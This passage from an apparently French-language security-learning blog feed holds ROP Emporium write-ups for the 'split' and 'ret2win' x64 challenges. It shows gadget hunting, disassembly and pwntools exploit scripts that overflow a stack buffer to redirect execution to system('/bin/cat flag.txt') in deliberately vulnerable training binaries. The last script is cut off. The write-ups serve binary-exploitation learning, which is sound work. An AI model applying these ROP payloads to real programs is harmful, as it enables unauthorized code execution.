</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400746</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: mov    edi,<span style="color:#ae81ff">0x40084a</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040074b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x400560</span> <span style="color:#f92672">&lt;</span>system<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400750</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>:  nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400751</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:  pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400752</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Elle fait donc appel à <code>system</code>, en lui passant un argument situé à l&rsquo;adresse <code>0x40084a</code>, voyons voir à quoi elle correspond</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x40084a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x40084a</span>: <span style="color:#e6db74">&#34;/bin/ls&#34;</span>
</span></span></code></pre></div><p>Cette fonction va donc éxecuter la commande <code>ls</code> via <code>system</code>, pas très utile&hellip; En revanche, on va pouvoir utiliser l&rsquo;adresse de l&rsquo;appel de la fonction <code>system</code> plus tard, alors gardons la de côté (<code>0x0040074b</code>)</p>
<p>Maintenant qu&rsquo;on va pouvoir appeller system, il faut trouver un string qu&rsquo;on va lui donner en argument, de préférence soit un <code>/bin/sh</code> pour avoir un shell, ou un <code>/bin/cat flag.txt</code> pour directement lire le flag. Regardons la liste des strings de l&rsquo;executable</p>
<pre tabindex="0"><code>strings -t x split                                                                                                       ✔ ╱ took 6s  ╱ at 15:21:31  
    238 /lib64/ld-linux-x86-64.so.2
    3b1 libc.so.6
    3bb puts
    3c0 printf
    3c7 memset
    3ce read
    3d3 stdout
    3da system
    3e1 setvbuf
    3e9 __libc_start_main
    3fb GLIBC_2.2.5
    407 __gmon_start__
    760 AWAVI
    767 AUATL
    7ba []A\A]A^A_
    7e8 split by ROP Emporium
    7fe x86_64
    807 Exiting
    810 Contriving a reason to ask user for data...
    83f Thank you!
    84a /bin/ls
    917 ;*3$&#34;
   1060 /bin/cat flag.txt
   1072 GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
   1731 crtstuff.c
   173c deregister_tm_clones
   1751 __do_global_dtors_aux
   1767 completed.7698
   1776 __do_global_dtors_aux_fini_array_entry
   179d frame_dummy
   17a9 __frame_dummy_init_array_entry
   17c8 split.c
   17d0 pwnme
   17d6 usefulFunction
   17e5 __FRAME_END__
   17f3 __init_array_end
   1804 _DYNAMIC
   180d __init_array_start
   1820 __GNU_EH_FRAME_HDR
   1833 _GLOBAL_OFFSET_TABLE_
   1849 __libc_csu_fini
   1859 stdout@@GLIBC_2.2.5
   186d puts@@GLIBC_2.2.5
   187f _edata
   1886 system@@GLIBC_2.2.5
   189a printf@@GLIBC_2.2.5
   18ae memset@@GLIBC_2.2.5
   18c2 read@@GLIBC_2.2.5
   18d4 __libc_start_main@@GLIBC_2.2.5
   18f3 __data_start
   1900 __gmon_start__
   190f __dso_handle
   191c _IO_stdin_used
   192b usefulString
   1938 __libc_csu_init
   1948 _dl_relocate_static_pie
   1960 __bss_start
   196c main
   1971 setvbuf@@GLIBC_2.2.5
   1986 __TMC_END__
   1993 .symtab
   199b .strtab
   19a3 .shstrtab
   19ad .interp
   19b5 .note.ABI-tag
   19c3 .note.gnu.build-id
   19d6 .gnu.hash
   19e0 .dynsym
   19e8 .dynstr
   19f0 .gnu.version
   19fd .gnu.version_r
   1a0c .rela.dyn
   1a16 .rela.plt
   1a20 .init
   1a26 .text
   1a2c .fini
   1a32 .rodata
   1a3a .eh_frame_hdr
   1a48 .eh_frame
   1a52 .init_array
   1a5e .fini_array
   1a6a .dynamic
   1a73 .got
   1a78 .got.plt
   1a81 .data
   1a87 .bss
   1a8c .comment
</code></pre><p>On voit un <code>/bin/cat flag.txt</code> situé à l&rsquo;offset <code>1060</code>. C&rsquo;est le string qu&rsquo;on va passer comme argument à <code>system</code>, mais pour ça, il va nous falloir son adresse. Puisque c&rsquo;est un string, il est situé dans la section <code>.data</code>. Essayons de trouver où elle se situe avec <code>pwndbg</code>. Pour ce faire, on peut utiliser la commande <code>readelf</code>, puis grep <code>.data</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>readelf <span style="color:#f92672">-</span>s split <span style="color:#f92672">|</span> grep <span style="color:#f92672">.</span>data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">15</span>: <span style="color:#ae81ff">00000000004007e0</span>     <span style="color:#ae81ff">0</span> SECTION LOCAL  DEFAULT   <span style="color:#ae81ff">15</span> <span style="color:#f92672">.</span>rodata
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">23</span>: <span style="color:#ae81ff">0000000000601050</span>     <span style="color:#ae81ff">0</span> SECTION LOCAL  DEFAULT   <span style="color:#ae81ff">23</span> <span style="color:#f92672">.</span>data
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">47</span>: <span style="color:#ae81ff">0000000000601050</span>     <span style="color:#ae81ff">0</span> NOTYPE  WEAK   DEFAULT   <span style="color:#ae81ff">23</span> data_start
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">49</span>: <span style="color:#ae81ff">0000000000601072</span>     <span style="color:#ae81ff">0</span> NOTYPE  GLOBAL DEFAULT   <span style="color:#ae81ff">23</span> _edata
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">56</span>: <span style="color:#ae81ff">0000000000601050</span>     <span style="color:#ae81ff">0</span> NOTYPE  GLOBAL DEFAULT   <span style="color:#ae81ff">23</span> __data_start
</span></span></code></pre></div><p>On voit que le début de notre section <code>.data</code> se trouve à l&rsquo;adresse <code>0x601050</code>. Notre offset pour <code>/bin/cat flag.txt</code> était <code>1060</code>, donc son adresse est <code>0x600000+0x1060</code> soit <code>0x601060</code></p>
<p>On peut vérifier que cette adresse est correcte avec <code>pwndbg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x601060</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x601060</span> <span style="color:#f92672">&lt;</span>usefulString<span style="color:#f92672">&gt;</span>:  <span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>
</span></span></code></pre></div><p>Parfait, c&rsquo;est bien l&rsquo;adresse de notre <code>/bin/cat flag.txt</code>.</p>
<p>Il nous manque à présent une dernière chose: un gadget <code>pop rdi; ret</code>.</p>
<blockquote>
<p>Dans les architectures x64, les arguments des fonctions passent par des <strong>registres</strong>. Par exemple, quand la fonction <code>system</code> va être appelée, elle va aller chercher son premier argument dans le registre <code>rdi</code>.</p>
</blockquote>
<p>Pour trouver ce gadget, on peut utiliser <code>ROPGadget</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary split <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007c3</span> : pop rdi ; ret
</span></span></code></pre></div><p>Maintenant qu&rsquo;on a notre gadget, récapitulons:</p>
<ul>
<li>Avec un padding de 40 bytes, on commence à réecrire la sauvegarde de <code>rip</code> (instruction pointer)</li>
<li>On peut mettre un pointeur vers <code>/bin/cat flag.txt</code>  dans <code>rdi</code> grâce à notre gadget <code>pop rdi; ret</code></li>
<li>On peut appeller la fonction <code>system</code> depuis son adresse puisque la protection <code>PIE</code> n&rsquo;est pas activée</li>
</ul>
<blockquote>
<p>Si PIE avait été activé, nous n&rsquo;aurions pas pu prendre l&rsquo;adresse de la fonction <code>system</code> puisqu&rsquo;elle aurait changé entre chaque exécution</p>
</blockquote>
<h2 id="final-payload">Final Payload</h2>
<p>Complétons notre exploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./split&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004007c3</span>)
</span></span><span style="display:flex;"><span>cat_flag <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x601060</span>)
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040074b</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> pop_rdi_ret <span style="color:#f92672">+</span> cat_flag <span style="color:#f92672">+</span> system
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Et maintenant, on le lance:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212481792-479ec049-ac21-4fc7-b527-da64381c21ef.png" alt="2023-01-14-155456_1115x137_scrot"></p>
<p>On a notre flag, gg !</p>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - ret2win (x64)</title>
            <link>/posts/2022/12/ropemporium-ret2win-x64/</link>
            <pubDate>Sat, 31 Dec 2022 00:00:00 +0000</pubDate>
            
            <guid>/posts/2022/12/ropemporium-ret2win-x64/</guid>
            <description>Note Je suis actuellement entrain d&amp;rsquo;apprendre le pwn donc il est possible que je fasse des erreurs ou que je dise des choses fausses dans ce post, si vous en voyez n&amp;rsquo;hésitez pas à me contacter sur discord.
File information Avant de commencer à regarder dans l&amp;rsquo;executable, il faut savoir à quoi on s&amp;rsquo;attaque, on va utiliser file pour avoir des informations sur le fichier, puis checksec pour voir les éventuelles sécuritées avec lesquelles il a été compilé</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Je suis actuellement entrain d&rsquo;apprendre le pwn donc il est possible que je fasse des erreurs ou que je dise des choses fausses dans ce post, si vous en voyez n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a>.</p>
<h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file ret2win
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret2win: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">ret2win</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>On va le run et voir ce qu&rsquo;il se passe</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212438458-863bbd90-ce7f-4af6-bdd0-e56ac4a6ba7f.png" alt="2023-01-13-194951_1041x663_scrot"></p>
<p>En lisant ce que le programme écrit on apprend plusieurs choses:</p>
<ul>
<li>La taille du buffer où est stocké notre input: 32 bytes</li>
<li>La fonction read() est utilisée pour lire notre input</li>
<li>read() va lire 56 bytes au maximum</li>
</ul>
<p>On va pouvoir overflow le buffer puisqu&rsquo;on peut écrire un nombre de bytes supérieur à la taille du buffer</p>
<p>Voici donc le début de notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span></code></pre></div><p>Ici, on déclare deux variables, une qui correspond au padding nécessaire pour remplir le buffer (padding), et une qui correspond au padding pour overwrite la sauvegarde de <code>rbp</code> (rbp)</p>
<p>On envoie ensuite notre payload mais en l&rsquo;occurence ici il ne va rien se passer puisque la sauvegarde de <code>rip</code> n&rsquo;a pas été overwrite.</p>
<p>La prochaine étape est de lister les symboles de l&rsquo;executable pour trouver notre fonction &ldquo;win&rdquo; (une fonction qui va nous permettre de lire le flag). Pour faire ça, on peut utiliser <code>pwndbg</code> par exemple:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>  All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400528</span>  _init
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400550</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400560</span>  system<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400570</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400580</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400590</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004005a0</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004005b0</span>  _start
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004005e0</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004005f0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400620</span>  register_tm_clones
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400660</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400690</span>  frame_dummy
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400697</span>  main
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004006e8</span>  pwnme
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400756</span>  ret2win
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400780</span>  __libc_csu_init
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004007f0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004007f4</span>  _fini
</span></span></code></pre></div><p>Une fonction sort du lot: <code>ret2win</code> (située à l&rsquo;adresse <code>0x0000000000400756</code>)</p>
<p>On va donc regarder ce qu&rsquo;elle fait plus en détail, toujours avec <code>pwndbg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass ret2win
</span></span><span style="display:flex;"><span>  Dump of assembler code <span style="color:#66d9ef">for</span> function ret2win:
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400756</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:  push   rbp
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400757</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:  mov    rbp,rsp
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x000000000040075a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400926</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x000000000040075f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400764</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>: mov    edi,<span style="color:#ae81ff">0x400943</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400769</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">19</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x400560</span> <span style="color:#f92672">&lt;</span>system<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x000000000040076e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;</span>: nop
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x000000000040076f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>: pop    rbp
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400770</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>: ret    
</span></span><span style="display:flex;"><span>  End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Il y a 2 <code>call</code>, un sur <code>puts</code> et un sur <code>system</code>. On voit qu&rsquo;il passe un argument à <code>system</code>, situé à l&rsquo;adresse <code>0x400943</code></p>
<p>On va donc regarder ce qui se trouve à cette adresse:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x400943</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x400943</span>: <span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>
</span></span></code></pre></div><p>Ok, donc c&rsquo;est effectivement notre fonction win, puisqu&rsquo;elle passe <code>&quot;/bin/cat flag.txt&quot;</code> en argument dans <code>system()</code>.</p>
<p>L&rsquo;idée va donc être d&rsquo;ajouter l&rsquo;adresse de cette fonction à la fin de notre payload, pour qu&rsquo;elle finisse dans la sauvegarde de <code>rip</code></p>
<blockquote>
<p>La sauvegarde de <code>rip</code> contient toujours l&rsquo;adresse de la prochaine instruction à éxecuter. Ici, en réecrivant sa valeur actuelle par l&rsquo;adresse de la fonction <code>ret2win</code>, on modifie la prochaine étape du programme en lui faisant appeler une fonction qui ne devait jamais être appelée. On a donc modifié son <strong>flux d&rsquo;éxecution</strong>.</p>
</blockquote>
<p>On peut compléter notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400756</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Maintenant, on lance l&rsquo;exploit et on devrait avoir le flag</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212438841-fe612582-a330-472b-ba9b-c9fa7f237d8f.png" alt="2023-01-13-201012_1135x146_scrot"></p>
<p>Et&hellip; le flag n&rsquo;a pas été print car le programme a <code>segfault</code>. Puisque je suis sous Ubuntu 22.04, qui est une version ultérieure à la 18.04 je suis affecté par les problèmes de <strong>stack alignment</strong> (MOVAPS)</p>
<p>Pour régler ça, on peut ajouter un gadget <code>ret</code>, qu&rsquo;on va trouver en utilisant <code>ROPgadget</code>, après notre padding</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary ret2win <span style="color:#f92672">|</span> grep ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040053e</span> : ret
</span></span></code></pre></div><h2 id="final-payload">Final Payload</h2>
<p>Maintenant qu&rsquo;on a l&rsquo;addresse du <code>ret</code> on peut l&rsquo;ajouter à notre payload, et il devrait fonctionner cette fois. Voici donc la version finale de l&rsquo;exploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400756</span>)
